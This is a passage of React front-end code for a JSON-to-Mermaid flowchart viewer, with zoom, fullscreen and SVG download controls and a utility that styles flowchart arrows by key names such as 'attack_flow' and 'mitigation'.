                handleFullscreen();
            }
        };

        document.addEventListener('keydown', handleKeyDown);
        return () => document.removeEventListener('keydown', handleKeyDown);
    }, [isFullscreen]);

    // Listen for fullscreen change events
    useEffect(() => {
        const handleFullscreenChange = () => {
            const isCurrentlyFullscreen = !!(document.fullscreenElement || 
                document.webkitFullscreenElement || 
                document.mozFullScreenElement || 
                document.msFullscreenElement);
            setIsFullscreen(isCurrentlyFullscreen);
        };

        document.addEventListener('fullscreenchange', handleFullscreenChange);
        document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
        document.addEventListener('mozfullscreenchange', handleFullscreenChange);
        document.addEventListener('MSFullscreenChange', handleFullscreenChange);

        return () => {
            document.removeEventListener('fullscreenchange', handleFullscreenChange);
            document.removeEventListener('webkitfullscreenchange', handleFullscreenChange);
            document.removeEventListener('mozfullscreenchange', handleFullscreenChange);
            document.removeEventListener('MSFullscreenChange', handleFullscreenChange);
        };
    }, []);

    return (React.createElement("div", { 
        className: `overflow-hidden relative rounded-lg h-full transition-all duration-200 shadow-lg mermaid-container ${
            isDarkMode 
                ? 'bg-gray-800 border border-gray-700' 
                : 'bg-white border border-gray-200'
        }`, 
        style: { 
            backgroundColor: isDarkMode ? '#1F2937' : '#FFFFFF',
            minHeight: '400px',
            maxHeight: '80vh'
        },
        onMouseMove: handleMouseMove,
        onMouseUp: handleMouseUp,
        onMouseLeave: handleMouseUp,
        onWheel: handleWheel,
        onTouchStart: handleTouchStart,
        onTouchMove: handleTouchMove,
        onTouchEnd: handleTouchEnd
    },
        React.createElement("div", { 
            className: "w-full h-full flex items-center justify-center p-4",
            style: {
                transform: `scale(${zoomLevel}) translate(${panX}px, ${panY}px)`,
                transformOrigin: 'center center',
                transition: isDragging ? 'none' : 'transform 0.1s ease-out',
                cursor: isDragging ? 'grabbing' : 'grab'
            },
            onMouseDown: handleMouseDown,
            onTouchStart: handleTouchStart
        }, children),
        
        // Zoom Controls
        React.createElement("div", { className: `zoom-controls absolute ${isFullscreen ? 'top-4 right-4' : 'top-2 right-2 sm:top-4 sm:right-4'} flex flex-col gap-1 sm:gap-2 z-10` },
            // Fullscreen Button
            React.createElement("button", {
                className: `rounded-full ${isFullscreen ? 'w-12 h-12' : 'w-8 h-8 sm:w-10 sm:h-10'} flex items-center justify-center transition-all duration-200 border-2 border-transparent hover:border-white touch-manipulation ${
                    isDarkMode 
                        ? 'bg-gray-700 hover:bg-gray-600 text-white' 
                        : 'bg-gray-600 hover:bg-gray-700 text-white'
                }`,
                onClick: handleFullscreen,
                title: isFullscreen ? "Exit Fullscreen (ESC)" : "Enter Fullscreen"
            }, React.createElement(Icon, { icon: isFullscreen ? "fullscreen-exit" : "fullscreen", size: isFullscreen ? 20 : 16 })),
            React.createElement("button", {
                className: `rounded-full ${isFullscreen ? 'w-12 h-12' : 'w-8 h-8 sm:w-10 sm:h-10'} flex items-center justify-center transition-all duration-200 border-2 border-transparent hover:border-white touch-manipulation ${
                    isDarkMode 
                        ? 'bg-gray-700 hover:bg-gray-600 text-white' 
                        : 'bg-gray-600 hover:bg-gray-700 text-white'
                }`,
                onClick: handleZoomIn,
                title: "Zoom In"
            }, React.createElement("span", { className: `${isFullscreen ? 'text-xl' : 'text-sm sm:text-lg'} font-bold` }, "+")),
            
            React.createElement("button", {
                className: `rounded-full ${isFullscreen ? 'w-12 h-12' : 'w-8 h-8 sm:w-10 sm:h-10'} flex items-center justify-center transition-all duration-200 border-2 border-transparent hover:border-white touch-manipulation ${
                    isDarkMode 
                        ? 'bg-gray-700 hover:bg-gray-600 text-white' 
                        : 'bg-gray-600 hover:bg-gray-700 text-white'
                }`,
                onClick: handleZoomOut,
                title: "Zoom Out"
            }, React.createElement("span", { className: `${isFullscreen ? 'text-xl' : 'text-sm sm:text-lg'} font-bold` }, "−")),
            
            React.createElement("button", {
                className: `rounded-full ${isFullscreen ? 'w-12 h-12' : 'w-8 h-8 sm:w-10 sm:h-10'} flex items-center justify-center transition-all duration-200 border-2 border-transparent hover:border-white touch-manipulation ${
                    isDarkMode 
                        ? 'bg-gray-700 hover:bg-gray-600 text-white' 
                        : 'bg-gray-600 hover:bg-gray-700 text-white'
                }`,
                onClick: handleReset,
                title: "Reset View"
            }, React.createElement("span", { className: `${isFullscreen ? 'text-lg' : 'text-sm'} font-bold` }, "⌂")),
            
            React.createElement("div", {
                className: `text-xs px-1 sm:px-2 py-1 rounded text-center ${
                    isDarkMode 
                        ? 'bg-gray-700 text-white' 
                        : 'bg-gray-600 text-white'
                }`,
                style: { 
                    minWidth: isFullscreen ? '60px' : '40px', 
                    fontSize: isFullscreen ? '12px' : '10px' 
                }
            }, `${Math.round(zoomLevel * 100)}%`)
        ),
        
        // Download Controls
        React.createElement(DownloadControls, { diagramRef: diagramRef })
    ));
}

function DownloadControls({ diagramRef }) {
    const [showDownloadOptions, setShowDownloadOptions] = useState(false);
    const [isDownloading, setIsDownloading] = useState(false);

    const downloadFormats = [
        { name: 'SVG', extension: 'svg', mimeType: 'image/svg+xml' }
    ];

    const generateFilename = (format) => {
        const timestamp = new Date().toISOString().slice(0, 19).replace(/:/g, '-');
        return `WF-Builder-developed by Tamilselvan-${timestamp}.${format.extension}`;
    };

    const downloadAsImage = async (format) => {
        if (!diagramRef?.current) {
            alert('Diagram not ready. Please wait for the diagram to load.');
            return;
        }
        
        setIsDownloading(true);
        try {
            // Wait for the diagram to be fully rendered
            await new Promise(resolve => setTimeout(resolve, 500));
            
            const svgElement = diagramRef.current.querySelector('svg');
            if (!svgElement) {
                throw new Error('No SVG diagram found. Please ensure the diagram is loaded.');
            }

            // SVG download with transparent background
            const clonedSvg = svgElement.cloneNode(true);
            
            // Remove background elements
            const rects = clonedSvg.querySelectorAll('rect[fill="#171717"]');
            rects.forEach(rect => rect.remove());
            
            // Set transparent background
            clonedSvg.style.backgroundColor = 'transparent';
            
            // Ensure proper SVG namespace
            if (!clonedSvg.getAttribute('xmlns')) {
                clonedSvg.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
            }
            
            const svgData = new XMLSerializer().serializeToString(clonedSvg);
            const svgBlob = new Blob([svgData], { type: 'image/svg+xml;charset=utf-8' });
            const url = URL.createObjectURL(svgBlob);
            
            const a = document.createElement('a');
            a.href = url;
            a.download = generateFilename(format);
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            alert(`SVG download started: ${generateFilename(format)}`);
            setIsDownloading(false);
            
        } catch (error) {
            console.error('Download failed:', error);
            alert(`Download failed: ${error.message}. Please try again.`);
            setIsDownloading(false);
        }
    };


    const handleDownload = (format) => {
        downloadAsImage(format);
    };

    return React.createElement("div", { className: "absolute top-4 left-4 flex flex-col gap-2 z-10" },
        React.createElement("button", {
            className: "bg-gray-700 hover:bg-gray-600 active:bg-gray-500 text-white rounded-full w-12 h-12 flex items-center justify-center transition-all duration-200 border-2 border-transparent hover:border-white touch-manipulation",
            onClick: (e) => {
                e.preventDefault();
                e.stopPropagation();
                setShowDownloadOptions(!showDownloadOptions);
            },
            onTouchStart: (e) => {
                e.preventDefault();
                e.stopPropagation();
            },
            title: "Download Options",
            disabled: isDownloading,
            style: { 
                minWidth: '48px', 
                minHeight: '48px',
                WebkitTapHighlightColor: 'transparent'
            }
        }, isDownloading ? 
            React.createElement("span", { className: "text-sm font-bold animate-spin" }, "⏳") :
            React.createElement(Icon, { icon: "download", size: 24 })
        ),
        
        showDownloadOptions && React.createElement("div", { 
            className: "absolute top-14 left-0 bg-gray-800 border border-gray-600 rounded-lg p-3 shadow-lg min-w-40 z-20",
            style: { 
                touchAction: 'manipulation',
                WebkitTapHighlightColor: 'transparent'
            }
        },
            React.createElement("div", { className: "text-white text-sm mb-3 font-semibold" }, "Download as:"),
            downloadFormats.map((format, index) => 
                React.createElement("button", {
                    key: index,
                    className: "w-full text-left text-white hover:bg-gray-700 active:bg-gray-600 px-3 py-2 rounded text-sm transition-colors touch-manipulation",
                    onClick: (e) => {
                        e.preventDefault();
                        e.stopPropagation();
                        handleDownload(format);
                        setShowDownloadOptions(false);
                    },
                    onTouchStart: (e) => {
                        e.preventDefault();
                        e.stopPropagation();
                    },
                    disabled: isDownloading,
                    style: { 
                        minHeight: '44px',
                        WebkitTapHighlightColor: 'transparent'
                    }
                }, `${format.name} (${format.extension.toUpperCase()})`)
            )
        )
    );
}

function SegmentedControl({ segments, onChange, defaultIndex = 0, isDarkMode = true }) {
    const [selectedIndex, setSelectedIndex] = useState(defaultIndex);
    const dir = document.dir === "rtl" ? -1 : 1;
    const gap = 0.25;
    const style = {
        transform: `translateX(calc(${100 * selectedIndex * dir}% + ${gap * 2 * selectedIndex * dir}rem))`,
        width: `calc(${100 / segments.length}% - ${gap * 2}rem)`
    };
    /**
     * Set the selected segment, then run the callback with the segment name.
     * @param name Name of segment
     * @param index Index of segment
     */
    function onIndexChange(name, index) {
        setSelectedIndex(index);
        onChange(name);
    }
    return (React.createElement("div", { className: `rounded-full flex justify-center items-center mt-0 mx-auto mb-3 relative w-full transition-colors duration-200 ${
        isDarkMode ? 'bg-gray-800' : 'bg-gray-200'
    }`, role: "tablist" },
        segments.map((option, i) => (React.createElement("button", { 
            key: i, 
            className: `bg-transparent rounded-full font-semibold text-sm p-2 w-full z-10 transition-all duration-200 focus:outline-none focus:ring focus:ring-blue-400 ${
                isDarkMode 
                    ? 'text-gray-400 hover:text-gray-200 focus-visible:text-gray-200 aria-selected:text-gray-100' 
                    : 'text-gray-600 hover:text-gray-800 focus-visible:text-gray-800 aria-selected:text-gray-900'
            }`, 
            type: "button", 
            role: "tab", 
            "aria-selected": selectedIndex === i, 
            onClick: () => onIndexChange(option.name, i) 
        }, option.friendlyName))),
        React.createElement("div", { className: `rounded-full shadow-md absolute inset-1 w-full transition-all duration-200 ${
            isDarkMode ? 'bg-gray-700' : 'bg-white'
        }`, style: style })));
}
function SelectMenu({ label, options, onChange, defaultValue, isDarkMode = true }) {
    return (React.createElement("label", { className: "flex items-center gap-2 mb-3 sm:w-max" },
        React.createElement("strong", { className: `font-medium leading-9 transition-colors duration-200 ${
            isDarkMode ? 'text-gray-100' : 'text-gray-900'
        }` }, label),
        React.createElement("span", { className: "relative inline-block w-full" },
            React.createElement("select", { 
                className: `border border-solid rounded block px-1.5 py-1 pe-7 w-full transition-all duration-200 focus:outline-none focus:ring focus:ring-blue-400 appearance-none ${
                    isDarkMode 
                        ? 'bg-gray-800 border-gray-700 hover:border-gray-600 text-gray-100' 
                        : 'bg-white border-gray-200 hover:border-gray-300 text-gray-900'
                }`, 
                onChange: onChange, 
                defaultValue: defaultValue,
                style: { maxHeight: '200px', overflowY: 'auto' }
            }, options.map((option, i) => {
                const { name, friendlyName } = option;
                return React.createElement("option", { key: i, value: name }, friendlyName);
            })),
            React.createElement("span", { className: `pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 transition-colors duration-200 ${
                isDarkMode ? 'text-gray-300' : 'text-gray-700'
            }` },
                React.createElement(Icon, { icon: "select" })))));
}
function Textarea({ id, label, value, onChange, readOnly, isDarkMode = true, isFullscreen = false, onFullscreenToggle = null }) {
    return (React.createElement("div", { className: `flex flex-col relative ${isFullscreen ? 'json-fullscreen' : 'h-full'}` },
        React.createElement("div", { className: "flex items-center justify-between mb-2" },
            React.createElement("label", { htmlFor: id, className: `font-medium leading-9 flex w-max transition-colors duration-200 ${
                isDarkMode ? 'text-gray-100' : 'text-gray-900'
            }` }, label),
            onFullscreenToggle && React.createElement("button", {
                className: `rounded-full w-8 h-8 flex items-center justify-center transition-all duration-200 border-2 border-transparent hover:border-white touch-manipulation ${
                    isDarkMode 
                        ? 'bg-gray-700 hover:bg-gray-600 text-white' 
                        : 'bg-gray-600 hover:bg-gray-700 text-white'
                }`,
                onClick: onFullscreenToggle,
                title: isFullscreen ? "Exit Fullscreen (ESC)" : "Enter Fullscreen"
            }, React.createElement(Icon, { icon: isFullscreen ? "fullscreen-exit" : "fullscreen", size: 16 }))
        ),
        React.createElement("textarea", { 
            id: id, 
            name: "textarea", 
            className: `border border-solid rounded block direction-ltr font-mono text-sm px-3 py-2 w-full h-full transition-all duration-200 focus:outline-none focus:ring focus:ring-blue-400 resize-none ${
                isDarkMode 
                    ? 'bg-gray-800 border-gray-700 hover:border-gray-600 text-gray-100' 
                    : 'bg-white border-gray-200 hover:border-gray-300 text-gray-900'
            }`, 
            value: value, 
            onChange: onChange, 
            readOnly: readOnly,
            style: isFullscreen ? { 
                minHeight: 'calc(100vh - 80px)',
                fontSize: '16px',
                lineHeight: '1.5'
            } : {}
        })));
}
function useColorScheme() {
    const [theme, setTheme] = useState(getTheme());
    function getTheme() {
        return window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "default";
    }
    useEffect(() => {
        const mediaQuery = window.matchMedia("(prefers-color-scheme: dark)");
        const handleChange = (event) => {
            setTheme(event.matches ? "dark" : "default");
        };
        mediaQuery.addEventListener("change", handleChange);
        return () => {
            mediaQuery.removeEventListener("change", handleChange);
        };
    }, []);
    return theme;
}
class Utils {
    /**
     * Generate flowchart code from a JSON object with cybersecurity attack styling
     * @param json JSON input
     * @param parent parent ID
     * @param lines line array
     */
    static flowchartFromJSON(json, parent = "root", lines = [], label) {
        const currentId = parent;
        if (typeof json !== "object" || json === null) {
            // prevent redundant quotes in the output 
            const jsonNoQuotes = JSON.stringify(json).replace(/['"]+/g, "");
            const nodeLabel = label ? `${label}: ${jsonNoQuotes}` : jsonNoQuotes;
            lines.push(this.nodeByType(json, currentId, nodeLabel, label));
            return lines;
        }
        const nodeLabel = label !== null && label !== void 0 ? label : "Object";
        if (Array.isArray(json)) {
            // array with special styling for attack vectors
            lines.push(`${currentId}["${nodeLabel}"]`);
            json.forEach((item, index) => {
                const childId = `${currentId}_item${index}`;
                lines.push(`${currentId} --> ${childId}`);
                this.flowchartFromJSON(item, childId, lines);
            });
        }
        else {
            // object with cybersecurity styling
            lines.push(`${currentId}("${nodeLabel}")`);
            for (const key in json) {
                const childId = `${currentId}_${key}`;
                const lineStyle = this.getLineStyle(key);
                lines.push(`${currentId} ${lineStyle} ${childId}`);
                this.flowchartFromJSON(json[key], childId, lines, key);
            }
        }
        return lines;
    }
    
    /**
     * Get line style based on relationship type
     * @param key relationship key
     */
    static getLineStyle(key) {
        const styleMap = {
            "attack_flow": "==>",
            "impact": "==>",
            "prevention": "==>",
            "mitigation": "==>",
            "consequences": "==>",
            "attack_vector": "==>",
            "payload": "==>",
            "target": "==>"
        };
        
        return styleMap[key] || "-->";
    }
    
    /**
     * Get node styling based on JSON type and cybersecurity context
     * @param json JSON to check
     * @param id node ID
     * @param label node label
     */
    static nodeByType(json, id, label, contextLabel) {
        if (typeof json === "boolean") {
            // hexagon for boolean values
            return `${id}{"${label}"}`;
        }
        if (typeof json === "number") {
            // stadium for numbers
            return `${id}(("${label}"))`;
        }
        if (typeof json === "string" && json.includes("http")) {
            // diamond for URLs
            return `${id}{"${label}"}`;
        }
        // rounded rectangle for strings
        return `${id}("${label}")`;
    }
}
var CopyStatus;
(function (CopyStatus) {
    CopyStatus[CopyStatus["Default"] = 0] = "Default";
    CopyStatus[CopyStatus["Failed"] = 1] = "Failed";
    CopyStatus[CopyStatus["Success"] = 2] = "Success";
})(CopyStatus || (CopyStatus = {}));